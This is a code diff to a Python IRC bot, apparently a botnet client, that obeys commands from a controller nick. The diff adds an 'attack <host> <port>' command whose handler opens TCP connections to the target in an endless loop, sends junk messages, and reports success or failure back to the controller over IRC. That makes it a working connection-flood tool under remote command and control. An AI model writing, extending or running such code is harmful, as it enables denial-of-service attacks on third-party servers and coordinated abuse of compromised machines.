@@ -81,8 +81,9 @@ class PyBot:
         #s.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends channel message
         self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8"))
 
-      elif senderMessage == "attack":
+      elif senderMessage.split()[0] == "attack":
         print("DEBUG --> attack requested by controller")
+        self.attackServer(senderMessage)
 
       elif senderMessage.split()[0] == "move":
         print("DEBUG --> move requested by controller")      #NOTE for later #should we check if the argument has a hash tag or not?
@@ -99,7 +100,41 @@ class PyBot:
         self.socket.send(bytes("QUIT \n","UTF-8"))
         self.socket.close()
         sys.exit()
-  
+
+  def attackServer(self,senderMessage):
+
+    if len(senderMessage.split()) == 3:
+      attackCounter = 1
+      attackHost = senderMessage.split()[1]
+      attackPort = senderMessage.split()[2]
+      print("DEBUG --> attempting to attack: "+attackHost+" "+attackPort)
+      while True: 
+        try:       
+          attackSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          attackSocket.connect((attackHost,int(attackPort)))
+          attackMessage = str(attackCounter) +" "+ self.nick
+          outMessage = "SUCCEED"
+          self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
+          attackSocket.send(bytes(attackMessage, "UTF-8"))
+          attackCounter += 1
+          attackSocket.close()
+        except:
+          #outMessage = self.nick+": attack failed, no such hostname"
+          outMessage = "FAILURE"
+          self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
+          print("DEBUG --> Unable to attack the server, host name doesn't exist: "+attackHost+" "+attackPort)
+          break
+    #I'm assuming that a successfull connection plus failed message = SUCCESS
+    
+    else: #Not enough arguments
+      print("DEBUG --> Controller tried to attack with this bot, invalid number of arguments")
+      outMessage = "Cannot attack with :"+self.nick+ " , invalid number of arguments"
+      self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
+      self.socket.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends public message
+      outMessage = "Usage> attack <host-name> <port>"
+      self.socket.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends public message
+      self.socket.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
+
   def changeServer(self,senderMessage):
    
     if len(senderMessage.split()) == 4:
